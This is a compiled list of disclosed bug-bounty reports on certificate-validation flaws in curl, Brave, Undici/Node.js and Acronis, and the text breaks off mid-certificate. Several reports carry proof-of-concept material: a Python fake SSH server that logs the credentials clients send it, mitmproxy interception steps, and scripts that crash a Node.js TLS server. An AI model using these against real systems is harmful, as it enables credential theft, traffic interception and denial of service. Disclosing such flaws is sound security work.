# Improper Certificate Validation

_12 reports — High/Critical, disclosed_

### [Silent TLS Trust Model Hijacking via `CURL_CA_BUNDLE` Environment Variable Leads to MITM](https://hackerone.com/reports/3418776)

- **Report ID:** `3418776`
- **Severity:** Critical
- **Weakness:** Improper Certificate Validation
- **Program:** curl
- **Reporter:** @rootsecret3
- **Bounty:** - usd
- **Disclosed:** 2025-11-11T06:40:53.061Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
curl is vulnerable to silent Man-in-the-Middle (MITM) attacks
due to its design, which implicitly trusts the CA certificate path specified in the CURL_CA_BUNDLE environment variable.

This mechanism allows the entire TLS trust model (chain of trust) of curl to be hijacked without any warning or notification to the user. This fundamentally violates the security promise of HTTPS connections, where users trust that curl will strictly verify server identities. By failing to warn when the system trust store is replaced, curl creates a false sense of security, allowing attackers to decrypt and manipulate HTTPS traffic.

I confirm that I performed the vulnerability discovery and core technical analysis manually. However, AI tools (such as Gemini/ChatGPT) were utilized solely for summarizing the findings, calculating the CVSS score, and drafting the formal report structure based on my raw technical data. AI was not used to generate the exploit code or perform the scan/discovery.

## Affected version
curl/libcurl version: 8.15.0
platform: x86_64-pc-linux-gnu
Release-Date: 2025-07-16, security patched: 8.15.0-1
Protocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns ldap ldaps mqtt pop3 pop3s rtmp rtsp scp sftp smb smbs smtp smtps telnet tftp ws wss
Features: alt-svc AsynchDNS brotli GSS-API HSTS HTTP2 HTTP3 HTTPS-proxy IDN IPv6 Kerberos Largefile libz NTLM PSL SPNEGO SSL threadsafe TLS-SRP UnixSockets zstd

## Steps To Reproduce:
Prepare two terminals.

In the first terminal
  1. download tools mitmproxy ( sudo apt install mitmproxy )
  2. After that, run the mitmproxy 
  3. and then click n 

second terminal
  1. Type the command in the terminal
export CURL_CA_BUNDLE=~/.mitmproxy/mitmproxy-ca-cert.pem

   2. Run curl to make an HTTPS request through the mitmproxy proxy. Users are unaware that TLS trust has been compromised.
curl --proxy http://localhost:8080 https://example.com

Exploit Verification (`curl` Failure):
* In the second `curl` Terminal: The command executed successfully without any SSL/TLS errors. This is proof that curl has silently accepted a fake CA and incorrectly reported the connection as secure.
* In the first terminal `mitmproxy` window: You will see HTTPS traffic from example.com in plain text (plaintext). This proves that the MITM attack was successful, and the confidentiality and integrity of the connection have been completely compromised.

## Supporting Material/References:
1. CWE-295: Improper Certificate Validation
2. The root cause of this security issue lies in how `curl` handles trust store replacement.
file source: `src/tool_operate.c`

environment and use it to replace the system's default trust store. Its failure is that it does not treat this operation as a highly security-sensitive action that requires explicit warning to the user. It is this silent replacement that undermines the HTTPS security model.

## Impact

## Summary: The impact of this design vulnerability is Critical. It allows for complete interception and manipulation of HTTPS traffic through Man-in-the-Middle (MITM) attacks.

* Total Loss of Confidentiality and Integrity: Attackers can read and modify all data sent or received by curl over HTTPS connections, including:
       * Login Credentials (Username, Password)
       * API Keys and Authentication Tokens (Bearer Tokens)
       * Session Cookies
       * Personal and Financial Data
       
* Creation of a False Sense of Security: This is the most dangerous impact. Users see https:// and believe that their connection is secure and verified. However, curl has secretly violated this security promise. curl's failure to warn users about the trust store replacement turns it from a secure tool into an attack vector.

This is not a matter of users being tricked into running commands, but rather `curl` failing to fulfill its fundamental security responsibility of enforcing TLS connection integrity.

---

### [SameSite restrictions are lifted, and SameSite:Strict cookie are being sent.](https://hackerone.com/reports/3253725)

- **Report ID:** `3253725`
- **Severity:** High
- **Weakness:** Improper Certificate Validation
- **Program:** Brave Software
- **Reporter:** @mingijung
- **Bounty:** - usd
- **Disclosed:** 2025-10-15T05:41:30.123Z
- **CVE(s):** CVE-2018-12402, CVE-2022-29912, CVE-2022-45410, CVE-2022-45413, CVE-2023-30674, CVE-2025-48980

**Vulnerability Information:**

## Summary:

hello, Brave team.
There are cases where the SameSite policy is being bypassed, and I would like to report them.
When a user left-clicks a link in a cross-domain context and selects "Open Link in Split View," all cookies—including those with SameSite=Strict—are sent, even though it is a cross-site navigation.

* For SameSite cookies, only SameSite=Lax cookies should be sent during cross-site navigations.

Before providing a detailed explanation, here is a list of CVEs and issues that were reported as a result of SameSite violations.: 
https://issues.chromium.org/issues/40057062
https://issues.chromium.org/issues/40050641
https://issues.chromium.org/issues/40057831
https://issues.chromium.org/issues/40053069
https://issues.chromium.org/issues/40091708
https://issues.chromium.org/issues/40091123
https://issues.chromium.org/issues/40091076
https://issues.chromium.org/issues/40091073
https://issues.chromium.org/issues/40091053
https://issues.chromium.org/issues/40091031
https://issues.chromium.org/issues/40090228
https://issues.chromium.org/issues/40087297
https://issues.chromium.org/issues/41385446
https://bugzilla.mozilla.org/show_bug.cgi?id=1873223&_gl=1*p8erhc*_ga*MTU3OTk5MjUwOC4xNzQxNTg0MzY3*_ga_MQ7767QQQW*czE3NDgzMjQ2NTYkbzMkZzEkdDE3NDgzMjQ3NTUkajAkbDAkaDA.
https://bugzilla.mozilla.org/show_bug.cgi?id=1844827&_gl=1*1pdtywb*_ga*MTU3OTk5MjUwOC4xNzQxNTg0MzY3*_ga_MQ7767QQQW*czE3NDgzMjQ2NTYkbzMkZzEkdDE3NDgzMjQ4MjQkajAkbDAkaDA.
https://bugzilla.mozilla.org/show_bug.cgi?id=1456652&_gl=1*1739v6q*_ga*MTU3OTk5MjUwOC4xNzQxNTg0MzY3*_ga_MQ7767QQQW*czE3NDgzMjQ2NTYkbzMkZzEkdDE3NDgzMjU3NjIkajAkbDAkaDA.
https://nvd.nist.gov/vuln/detail/CVE-2018-12402
https://nvd.nist.gov/vuln/detail/cve-2022-29912
https://nvd.nist.gov/vuln/detail/cve-2022-45410
https://nvd.nist.gov/vuln/detail/cve-2022-45413
CVE-2023-30674

There was a case similar to the vulnerability that we are reporting, where a SameSite=Strict cookie was bypassed due to user interaction.:
https://issues.chromium.org/issues/40091708


The reason SameSite=Strict cookies are being sent in this case is because the Sec-Fetch-Site: cross-site header, which should normally be present, is missing. To prevent SameSite bypass and protect against CSRF attacks, this header should be properly included in the request.

thank you for reading.



## Products affected: 

Brave	1.80.120 in window operation

## Steps To Reproduce:

```
<a href='https://SameSite.check.com' target='_blank'>1234</a>" frameborder="0">
```
Try opening the hyperlink above using the "Open Link in Split View" option — even SameSite=Strict cookies are sent.

Try opening the link using other options as well—such as "Open in New Tab" or "Open in Incognito Window"—and compare the cookies that are sent in each case.

A video demonstrating the proof of concept (POC) has been included.


## Supporting Material/References:
*https://issues.chromium.org/issues/40091708*
https://issues.chromium.org/issues/40057062
https://issues.chromium.org/issues/40050641
https://issues.chromium.org/issues/40057831
https://issues.chromium.org/issues/40053069
https://issues.chromium.org/issues/40091708
https://issues.chromium.org/issues/40091123
https://issues.chromium.org/issues/40091076
https://issues.chromium.org/issues/40091073
https://issues.chromium.org/issues/40091053
https://issues.chromium.org/issues/40091031
https://issues.chromium.org/issues/40090228
https://issues.chromium.org/issues/40087297
https://issues.chromium.org/issues/41385446
https://bugzilla.mozilla.org/show_bug.cgi?id=1873223&_gl=1*p8erhc*_ga*MTU3OTk5MjUwOC4xNzQxNTg0MzY3*_ga_MQ7767QQQW*czE3NDgzMjQ2NTYkbzMkZzEkdDE3NDgzMjQ3NTUkajAkbDAkaDA.
https://bugzilla.mozilla.org/show_bug.cgi?id=1844827&_gl=1*1pdtywb*_ga*MTU3OTk5MjUwOC4xNzQxNTg0MzY3*_ga_MQ7767QQQW*czE3NDgzMjQ2NTYkbzMkZzEkdDE3NDgzMjQ4MjQkajAkbDAkaDA.
https://bugzilla.mozilla.org/show_bug.cgi?id=1456652&_gl=1*1739v6q*_ga*MTU3OTk5MjUwOC4xNzQxNTg0MzY3*_ga_MQ7767QQQW*czE3NDgzMjQ2NTYkbzMkZzEkdDE3NDgzMjU3NjIkajAkbDAkaDA.
https://nvd.nist.gov/vuln/detail/CVE-2018-12402
https://nvd.nist.gov/vuln/detail/cve-2022-29912
https://nvd.nist.gov/vuln/detail/cve-2022-45410
https://nvd.nist.gov/vuln/detail/cve-2022-45413
CVE-2023-30674

## Impact

{F4569378}

---

### [Apple SecTrust legacy path accepts untrusted certificates on pre-10.14 macOS/iOS when built with USE_APPLE_SECTRUST](https://hackerone.com/reports/3374554)

- **Report ID:** `3374554`
- **Severity:** High
- **Weakness:** Improper Certificate Validation
- **Program:** curl
- **Reporter:** @giant_anteater
- **Bounty:** - usd
- **Disclosed:** 2025-10-09T06:22:03.208Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
When libcurl is built with USE_APPLE_SECTRUST and runs on Apple OS versions that lack SecTrustEvaluateWithError (macOS <10.14 / iOS <12), the legacy verification path miscompares OSStatus to SecTrustResultType and never checks the SecTrust result. This can cause untrusted certificates to be accepted.

[Statement clarifying if an AI was used to find the issue or generate the report]
This report was prepared with assistance from an AI code analysis tool; the core diagnosis and scope were validated by a combination of classical software, manual inspection of the code, and AI.

## Affected version
Reproduced on current master (as of 2025‑10‑07). Affects builds that enable `USE_APPLE_SECTRUST` and run on macOS <10.14 / iOS <12. The defect is in `lib/vtls/apple.c` and is independent of the TLS backend choice (it is reached via OpenSSL or GnuTLS when the native CA store is used).

## Steps To Reproduce:

### Code Verification (Any modern macOS):

1. Inspect the vulnerable code in `lib/vtls/apple.c` lines 263-275
2. Observe the type confusion: `status` (OSStatus) is compared to `kSecTrustResultType` enum values
3. Create test program demonstrating the logic bug (see verification artifacts)
4. Create untrusted certificate and verify system curl rejects it

### Runtime Exploitation (Requires macOS <10.14 or iOS <12):

**Note:** This requires an actual legacy system. Building with 
`-DCMAKE_OSX_DEPLOYMENT_TARGET=10.13` on modern macOS will NOT trigger 
the bug at runtime due to `__builtin_available` checks.

1. On a system running macOS 10.13.6 (High Sierra) or earlier, build curl:
   ```
   cmake -DUSE_APPLE_SECTRUST=ON -DCURL_USE_OPENSSL=ON \
         -DCMAKE_BUILD_TYPE=Release ..
   ```

2. Create untrusted certificates (as described)

3. Start test server: `openssl s_server -accept 8443 -www -key leaf.key -cert leaf.pem`

4. Test: `./src/curl -v https://localhost:8443/`
   - **Expected secure behavior:** Connection rejected
   - **Actual buggy behavior:** Connection succeeds

### Alternative Verification Without Legacy Hardware:

Since the bug is a clear logic error (comparing wrong variable), it can be 
confirmed through:
- Static code analysis (lines 270-271 compare `status` instead of `sec_result`)
- Logic demonstration (status=0 never equals kSecTrustResultUnspecified=4)
- The fact that `result` remains `CURLE_OK` when the conditions fail

## Supporting Material/References:

Problematic code (legacy fallback uses SecTrustEvaluate; compares `status` to SecTrustResultType instead of checking `sec_result`):

```263:275:lib/vtls/apple.c
#ifndef REQUIRES_SecTrustEvaluateWithError
SecTrustResultType sec_result;
status = SecTrustEvaluate(trust, &sec_result);

if(status != noErr) {
  failf(data, "Apple SecTrust verification failed: error %i", (int)status);
}
else if((status == kSecTrustResultUnspecified) ||
        (status == kSecTrustResultProceed)) {
  /* "unspecified" means system-trusted with no explicit user setting */
  result = CURLE_OK;
}
#endif /* REQUIRES_SecTrustEvaluateWithError */
```

Correct modern code path (only available on 10.14+/iOS 12+):
```238:240:lib/vtls/apple.c
result = SecTrustEvaluateWithError(trust, &error) ?
         CURLE_OK : CURLE_PEER_FAILED_VERIFICATION;
```

Behavioral gates where Apple SecTrust verification is invoked:
- OpenSSL:
```5165:5177:lib/vtls/openssl.c
if(!verified &&
   conn_config->verifypeer && ssl_config->native_ca_store &&
   (ossl_verify == X509_V_ERR_UNABLE_TO_GET_ISSUER_CERT_LOCALLY)) {
  result = ossl_apple_verify(..., &verified);
  ...
}
```
- GnuTLS:
```1666:1676:lib/vtls/gtls.c
if(!verified && ssl_config->native_ca_store &&
   (verify_status & GNUTLS_CERT_SIGNER_NOT_FOUND)) {
  result = glts_apple_verify(..., &verified);
  ...
}
```
```

## Impact

## Summary:
On affected configurations (USE_APPLE_SECTRUST builds running on pre‑10.14 Apple OS with native CA verification engaged), an attacker can bypass TLS certificate validation. This enables Man‑in‑the‑Middle interception, compromising confidentiality and integrity of HTTPS and other TLS‑protected transfers.

Scope caveats:
- Feature is compile‑time gated (`USE_APPLE_SECTRUST`) and off by default in CMake.
- Runtime reachability depends on backend conditions (OpenSSL “unable to get local issuer certificate” or GnuTLS “signer not found”).
- The bug only affects older Apple OS versions that lack `SecTrustEvaluateWithError`; modern Apple OS uses the correct code path.

---

### [curl allows SSH connection even if host is not in known_hosts](https://hackerone.com/reports/2961050)

- **Report ID:** `2961050`
- **Severity:** High
- **Weakness:** Improper Certificate Validation
- **Program:** curl
- **Reporter:** @nyymi
- **Bounty:** - usd
- **Disclosed:** 2025-02-05T21:41:40.866Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Curl does _not_ fail if the SSH host identity cannot be verified due to the host not being included in the `.ssh/known_hosts` file. This makes using curl to login into an previously unknown ssh host system vulnerable to meddler in the middle attacks. When using key based authentication it will allow a malicious host to spoof the real system, and either return tampered or otherwise malicious content on download, or capture the uploads. When using username + password authentication it will also leak the username and password to the attacker, and thus allow the attacker to connect to the intended target host. 

Curl does have `--insecure` option which is said to:

```
              For SFTP and SCP, this option makes curl skip the known_hosts
              verification.  known_hosts is a file normally stored in the
              user's home directory in the ".ssh" subdirectory, which contains
              hostnames and their public keys.
```
From this it would be easy to assume that omitting `--insecure` would mean that the connection is secure, that is: the connection would fail if the host identity can't be verified *or* curl would prompt the user to verify the host key similar to how SSH command does. However, this is not the case, and the connection will succeed if the host is not in the `.ssh/known_hosts` file. The current curl behaviour is similar to ssh being used with `StrictHostKeyChecking` `accept-new`.

Note that while curl does warn of the issue with `Warning: Couldn't find a known_hosts file` this is too late:

```
$ curl --user foo sftp://localhost:2222
Enter host password for user 'foo':
Warning: Couldn't find a known_hosts file
curl: (67) Login denied
```
The warning is issued only after the password has been requested. The username & password have already been sent to the malicious server by the time the user sees the warning:
```
INFO:root:[pass] Authenticated username foo password bar
```
The warning also is quite useless when curl is being called from scripts as the command is not failing.

## Affected version
8.11.1

## Steps To Reproduce:
  1. `./configure --with-openssl --with-libssh` (or `--with-libssh2`)
  2. `make`
  3. Have no entry of targethost in `.ssh/known_hosts`file.
  4. `(DY)LD_LIBRARY_PATH=lib/.libs src/curl  sftp://foo:bar@targethost`

The middler in the middle will obtain the credentials:
```
INFO:root:[pass] Authenticated username foo password bar
```

## Supporting Material/References:

Here's a minimal fake SSH server dumping username & password sent to it. The server runs on port 2222.
```
#!/usr/bin/env python3

import paramiko.rsakey
import paramiko
import threading
import logging
import socket

logging.basicConfig(level = logging.INFO)

class SSHServer(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()

    def get_allowed_auths(self, username):
        logging.debug('[auth] Get username {} allowed auths'.format(username))
        return "password,publickey,none"

    def check_auth_none(self, username):
        logging.debug('[none] Authenticated username {}'.format(username))
        return paramiko.AUTH_FAILED

    def check_auth_password(self, username, password):
        logging.info('[pass] Authenticated username {} password {}'.format(username, password))
        return paramiko.AUTH_FAILED

class ClientConnection(threading.Thread):
    def __init__(self, group = None, target = None, name = None, args = ()):
        threading.Thread.__init__(self, group = group, target = target, name = name)
        self.args = args

    def run(self):
        hostkey = self.args[0]
        client = self.args[1]
        transport = None
        chan = None

        try:
            transport = paramiko.Transport(client)
            try:
                transport.load_server_moduli()
            except:
                pass

            transport.add_server_key(hostkey)
            server = SSHServer()
            try:
                transport.start_server(server=server)
            except:
                logging.warning('*** SSH negotiation failed, disconnect')
                client.close()
                return

            logging.info('Full remote version: {}'.format(transport.remote_version))

            chan = transport.accept(10)
            if chan:
                chan.close()
            transport.close()

        except Exception as e:
            logging.info('*** Caught exception: {}: {}'.format(str(e.__class__), str(e)))
            if chan:
                chan.close()
            if transport:
                transport.close()
            pass


def main():
    hostkey = paramiko.rsakey.RSAKey.generate(1024)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('', 2222))
    sock.listen(7)

    while True:
        client, addr = sock.accept()
        logging.info('Received connection from {}:{}'.format(addr[0], addr[1]))
        t = ClientConnection(args = (hostkey, client,))
        t.start()

if __name__ == '__main__':
    main()
```

  * [attachment / reference]

## Impact

## Summary:
- Download of malicious content (on download).
- Leak of confidential information (on upload).
- Leak of credentials (if using password auth).

---

### [Undici does not use CONNECT or otherwise validate upstream HTTPS certificates when using a proxy](https://hackerone.com/reports/1583680)

- **Report ID:** `1583680`
- **Severity:** High
- **Weakness:** Improper Certificate Validation
- **Program:** Node.js
- **Reporter:** @pimterry
- **Bounty:** - usd
- **Disclosed:** 2022-07-13T14:47:02.856Z
- **CVE(s):** CVE-2022-32210

**Vulnerability Information:**

**Summary:** When using Undici with its ProxyAgent, it does not use CONNECT or correctly verify the upstream server's HTTPS certificate.

**Description:**

This affects both Undici itself and global fetch() in Node 18 when used with Undici's ProxyAgent. I've submitted this here for Node as it affects global fetch, and Undici isn't listed in the options (even though Undici's SECURITY.md says to report issues the same way as Node issues: https://github.com/nodejs/undici/blob/main/SECURITY.md)

Some context is required to explain the issue so this is quite long, sorry!

In general, given a setup like:

Undici client -> proxy.example -> remote-server.example

There's two possible ways to use the proxy server: you can send CONNECT to create a tunnel to the remote server, and then make a request within that tunnel (setting up TLS in the tunnel first, if making an HTTPS request) or you can make a request with an absolute URL like "GET http://remote-server.example/abc" to the proxy server, and expect that proxy to connect upstream and make the request for you.

The former CONNECT approach is far more common. Using the latter form is rare for plain HTTP and should _never_ be used for HTTPS: it exposes all request & response data to the proxy, delegates all upstream certificate trust handling to the proxy, and additionally if the connection to the proxy is plain HTTP then it unwraps and exposes all HTTPS traffic on the network between the proxy & client, sending all HTTPS data in plain text.

Using CONNECT meanwhile would mean that HTTPS connections are secure even when sent via plain-text HTTP proxies (only the target domain is exposed to observers, and it cannot be usefully modified). This has meant that plaintext-only HTTP proxies remain common today, even in the modern HTTPS-only world, just providing dumb tunnels that are secured independently.

To make this work, what should normally happen when proxying HTTPS traffic to remote-server.example via proxy.example is:

* Undici connects to proxy.example (via HTTP or HTTPS - depends on the proxy setup, but either is basically fine)
* Undici sends "CONNECT remote-server.example:443" to the proxy server
* The proxy server connects to that address
* The proxy server responds to Undici with 200 OK, and then all future bytes are passed raw between Undici & the remote server
* Undici does normal TLS setup through this tunnel with the remote server, validating the certificate as normal.
* Once TLS is set up, Undici makes an HTTP request inside the TLS connection, inside the proxy tunnel.

This means that nobody on the network path between Undici and the remote server (including the proxy, and anybody else en route) can see or modify the HTTP request or response. https://en.wikipedia.org/wiki/HTTP_tunnel#HTTP_CONNECT_method has more details, as does the RFC: https://datatracker.ietf.org/doc/html/rfc7231#section-4.3.6.

That's how it should work. In practice, Undici's implementation (https://github.com/nodejs/undici/blob/main/lib/proxy-agent.js) appears to just send "GET https://remote-server.example" to the proxy (i.e. it just makes all URLs absolute, and then redirects the connection to the proxy instead of the real server).

This means Undici never verifies the remote server's certificate itself, and always exposes all request & response data to the proxy. This unexpectedly means that proxies can MitM all HTTPS traffic, and if the proxy's URL is HTTP (http://proxy.example) then it also means that nominally HTTPS requests are actually sent via in plain-text HTTP between Undici and the proxy server.

This also creates other major bugs too, for example when connecting to a proxy via HTTPS, it seems like the proxy's certificate is verified against the remote server's domain name, not the proxy's domain name, which makes HTTPS proxying unusable in most (all?) cases. This is a related bug which does not expose users to danger (it just breaks things) but I suspect this means that most users using proxies are using them over HTTP, assuming that this is still secure because Undici uses the standard CONNECT approach. It does not.

## Steps To Reproduce:

1. Use any proxy that supports HTTPS upstream connections and HTTP downstream connections. For a quick test, you can use https://hub.docker.com/r/vimagick/privoxy/ with Docker by running `docker run --rm -it -p 8118:8118 vimagick/privoxy:latest` to start an HTTP proxy on localhost:8118.
2. Then make a request to a HTTPS site with an invalid certificate (e.g. https://self-signed.badssl.com/) using Undici with this proxy , like so:
```
const undici = require('undici')
const dispatcher = new undici.ProxyAgent({ uri: "http://localhost:8118" })
console.log((await undici.fetch("https://self-signed.badssl.com", { dispatcher })).status);
```
3. The request should fail. The upstream certificate is self signed and completely invalid. Instead it succeeds and prints 200.

This works in Node 16.14.2 using Undici 5.3.0, and in Node 18.2.0 using Undici 5.3.0 or the built-in `fetch()` method. AFAICT this affects all versions of both. This works for all badssl.com test sites that should fail, including expired certificates, and certificates with the wrong hostname.

You can confirm that this should be rejected by removing the `{ dispatcher }` option. Sending the request directly without the proxy will correctly throw a `Error: self-signed certificate` error.

This is not really related to the proxy configuration. The proxy here could verify the upstream certificate and it doesn't, but in my quick bit of testing for this issue it appears that no proxies verify upstream certificates for you because nobody should ever be sending HTTPS traffic in plaintext through a proxy like this. Some proxies disallow non-CONNECT connections entirely, which avoids this issue, but that means they are totally unusable with Undici's ProxyAgent in all cases.

HTTPS clients using proxies should always open a direct tunnel to the remote server via CONNECT, and then verify an end-to-end TLS connection on top of that as normal.

---

The above reproduces the main "HTTPS via HTTP proxy is not secure" bug. To reproduce the related bug, where HTTPS certificates with HTTPS proxies is not validated correctly and so unusable:

1. Install 'proxy' from npm
2. Run `openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -sha256 -days 365`
3. Enter 'passphrase' as the passphrase and 'localhost' as the common name
4. Start an HTTPS proxy using this cert by running:
```
const https = require('https');
const proxy = require('proxy');
const fs = require('fs');

proxy(https.createServer({
    key: fs.readFileSync('./key.pem'),
    passphrase: 'passphrase',
    cert: fs.readFileSync('./cert.pem')
})).listen(8443);
```
5. In a new terminal in the same directory, run `export NODE_EXTRA_CA_CERTS=$(pwd)/cert.pem` to trust the proxy's certificate.
6. In another node process in that terminal, use this proxy from Undici:
```
const undici = require('undici')
const dispatcher = new undici.ProxyAgent({ uri: "https://localhost:443" }); // HTTPS connection to server
console.log((await undici.fetch("https://example.com", { dispatcher })).status);
```
7. This throws "Error [ERR_TLS_CERT_ALTNAME_INVALID]: Hostname/IP does not match certificate's altnames: Host: example.com. is not cert's CN: localhost".

This is incorrect validation, because the 'localhost' certificate is the certificate of the proxy, not the remote server. Since that certificate is trusted, it should be acceptable for the connection to the localhost proxy, and the server's certificate should be retrieved via a CONNECT tunnel and validated separately. All together, this makes HTTPS proxies unusable with Undici.

## Impact

This very seriously affects all use of HTTPS via a HTTP proxy with Undici or Node's global fetch. In this case, it removes all HTTPS security from all requests sent using Undici's ProxyAgent, allowing trivial MitM attacks by anybody on the network path between the client and the target server (local network users, your ISP, the proxy, the target server's ISP, etc). Attackers can MitM the connection freely, using any certificate they like with no validation involved, allowing them to view or modify all request & response details.

This less seriously affects HTTPS via HTTPS proxies, but it's still bad: when you send HTTPS via a proxy to a remote server, the proxy can freely view or modify all HTTPS traffic unexpectedly (but only the proxy - generally not anybody else on the network path). This is mitigated by this use case being entirely broken in Undici right now though AFAICT, since the proxy's HTTPS certificate is never validated correctly and so is always rejected. On the other hand, that does mean all proxy users must be using plain-text HTTP, which is seriously impacted by this issue.

---

### [Undici ProxyAgent vulnerable to MITM ](https://hackerone.com/reports/1599063)

- **Report ID:** `1599063`
- **Severity:** High
- **Weakness:** Improper Certificate Validation
- **Program:** Internet Bug Bounty
- **Reporter:** @pimterry
- **Bounty:** 1000 usd
- **Disclosed:** 2022-07-13T13:20:15.817Z
- **CVE(s):** -

**Vulnerability Information:**

Full GitHub advisory summarizing the issue is here: https://github.com/nodejs/undici/security/advisories/GHSA-pgw7-wx7w-2w33
The original Node.js HackerOne report is here: https://hackerone.com/bugs?report_id=1583680

This was fixed & disclosed in Undici v5.5.1.

This primarily affects Undici, a subproject under the Node.js umbrella, which is experimentally included as part of recent Node.js releases. This issue doesn't immediately affect standalone Node.js usage today due to the limited APIs initially exposed, but it does affect all usage of Node.js's new Fetch API with HTTP proxies (since Undici was required for that) and @mcollina in https://hackerone.com/bugs?report_id=1583680 who processed the Node.js security report said this should be eligible for a Node.js bounty.

## Impact

See https://github.com/nodejs/undici/security/advisories/GHSA-pgw7-wx7w-2w33 for more details but in short: it allows for trivial MitM of all HTTPS traffic sent to a proxy with Undici's ProxyAgent API. In all cases the proxy can invisibly MitM 'secure' traffic, and in most cases everybody else on the network path can do so too.

**Summary (team):**

ProxyAgent vulnerable to MITM

Description
Undici.ProxyAgent never verifies the remote server's certificate, and always exposes all request & response data to the proxy. This unexpectedly means that proxies can MitM all HTTPS traffic, and if the proxy's URL is HTTP then it also means that nominally HTTPS requests are actually sent via plain-text HTTP between Undici and the proxy server.

Impact
This affects all use of HTTPS via HTTP proxy using Undici.ProxyAgent with Undici or Node's global fetch. In this case, it removes all HTTPS security from all requests sent using Undici's ProxyAgent, allowing trivial MitM attacks by anybody on the network path between the client and the target server (local network users, your ISP, the proxy, the target server's ISP, etc).
This less seriously affects HTTPS via HTTPS proxies. When you send HTTPS via a proxy to a remote server, the proxy can freely view or modify all HTTPS traffic unexpectedly (but only the proxy).

Patches
This issue was patched in Undici v5.5.1.

Workarounds
At the time of writing, the only workaround is to not use ProxyAgent as a dispatcher for TLS Connections.

GHSA Link: https://github.com/nodejs/undici/security/advisories/GHSA-pgw7-wx7w-2w33

---

### [Acronis True Image 2021 (windows) does not validate server hostname on a login TLS connection](https://hackerone.com/reports/1070533)

- **Report ID:** `1070533`
- **Severity:** High
- **Weakness:** Improper Certificate Validation
- **Program:** Acronis
- **Reporter:** @aapo
- **Bounty:** 250 usd
- **Disclosed:** 2021-08-10T18:02:44.894Z
- **CVE(s):** -

**Summary (team):**

Acronis True Image prior to 2021 Update 4 for Windows, Acronis True Image prior to 2021 Update 5 for Mac did not properly validate SSL certificate. The issue was assigned CVE-2021-32581. We have seen no signs of the exploitation of this vulnerability.

---

### [Acronis True Image  (Windows) does not validate server certificate on a TLS connection](https://hackerone.com/reports/1056144)

- **Report ID:** `1056144`
- **Severity:** High
- **Weakness:** Improper Certificate Validation
- **Program:** Acronis
- **Reporter:** @aapo
- **Bounty:** 500 usd
- **Disclosed:** 2021-08-05T12:53:21.360Z
- **CVE(s):** -

**Summary (team):**

Acronis True Image prior to 2021 Update 4 for Windows, Acronis True Image prior to 2021 Update 5 for Mac did not implement SSL certificate validation. The issue was assigned CVE-2021-32581. We have seen no signs of the exploitation of this vulnerability.

---

### [Only OpenSSL handles a CRL when passed in via CApath ](https://hackerone.com/reports/713975)

- **Report ID:** `713975`
- **Severity:** High
- **Weakness:** Improper Certificate Validation
- **Program:** curl
- **Reporter:** @salvet
- **Bounty:** - usd
- **Disclosed:** 2021-01-08T09:09:22.411Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Code in vtls/nss.c interprets CApath option differently than OpenSSL-using code,
user can be mislead to unsecure use of curl/libcurl easily. CApath directory
can contain CRL files in addition to CA certificate files and they are used
for certificate verification when curl calls OpenSSL. Code path using NSS blindly
loads all files residing in CApath as CA certificates instead, which has two effects:
first, the meaning of CRLs is ignored and revoked certificates can be accepted,
second, NSS may find duplicate SN in corrupt 'CA certificate' during TLS handshake and break
connection to legitimate server (NSS does not perform full validation in load
and search routines, ASN.1 templates used can mistakenly match both types of object).
Such use is not explicitly supported according to curl documentation strictly speaking
but I find current implementation very risky (I know security professionals who have fallen to this trap)
and recommend adding validation/type detection for each file loaded
from CApath (or using c_hash-style name extensions if any file with such extension
is present, if full validation is deemed too complicated or as a quick fix helping most users).

# Steps To Reproduce:
  1. revoke a certificate, install resulting CRL in CApath, try with NSS-based curl
  2. try connecting TLS server whose CA has self-signed certificate with SN=1 and CRL in CApath
     (success can depend on order of directory entries)

## Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]

  * [attachment / reference]

## Impact

An attacker can impersonate TLS server using revoked (presumably leaked) certificate.

---

### [Remotely trigger an assertion on a TLS server with a malformed certificate string](https://hackerone.com/reports/746733)

- **Report ID:** `746733`
- **Severity:** Critical
- **Weakness:** Improper Certificate Validation
- **Program:** Node.js
- **Reporter:** @rogierschouten
- **Bounty:** - usd
- **Disclosed:** 2020-02-06T20:47:23.016Z
- **CVE(s):** CVE-2019-15604

**Vulnerability Information:**

**Summary:** 
Connecting to a NodeJS TLS server with a client certificate that has a type 19 string in its subjectAltName will crash the TLS server if it tries to read the peer certificate.

Affected versions include v10.17.0 and v13.1.0.

This is related to issue https://github.com/nodejs/node/issues/30521 but it works the other way around: in that issue, the client crashes; in this example, the server crashes. 

It is likely that the fix for that issue will also fix this.

**Description:** 
Using e.g. node-forge it is possible to create certificates without common name and with any subjectAltName content.  Hence anybody can create a malformed certificate and send it to a node server. The server will encounter an assertion in node_crypto.cc

## Steps To Reproduce:

1. Store all files below  (under supporting material) in the same directory
2. Start node ./server.js
3. Start node ./client.js
4. Result: assertion error in the server



## Impact:

Anybody can remotely connect to a TLS server and supply an invalid certificate, causing the server to crash, hence this is a denial-of-service possibility.

## Supporting Material/References:


server.js:

```javascript
const tls = require("tls");
const fs = require("fs");

let server = tls.createServer({
    ca: fs.readFileSync("./ca.crt"),
    cert: fs.readFileSync("./server.crt"),
    key: fs.readFileSync("./server.key"),
    requestCert: true,
    rejectUnauthorized: true
}, (socket) => {
    socket.setEncoding("utf8");
    socket.on("data", (data) => {
        console.log("server.socket.data", data);
        socket.write(data);
    });
    socket.on("end", () => undefined);
    socket.on("error", () => undefined);

    // THIS CRASHES THE SERVER
    console.log(socket.getPeerCertificate());
});
server.listen({ port: 12345 }, () => {
    console.log("listening!")
});
```


client.js:

```javascript
const tls = require("tls");
const fs = require("fs");
const client = tls.connect({
    host: "pc57.network.local",
    port: 12345,
    ca: [fs.readFileSync("./server.crt")],
    key: fs.readFileSync("./client.key"),
    cert: fs.readFileSync("./client.crt")
}, () => {
    client.write("foo");
    client.end();
});
client.on("data", () => undefined);
client.on("error", () => undefined);
client.on("end", () => undefined);
```

ca.crt:

```
-----BEGIN CERTIFICATE-----
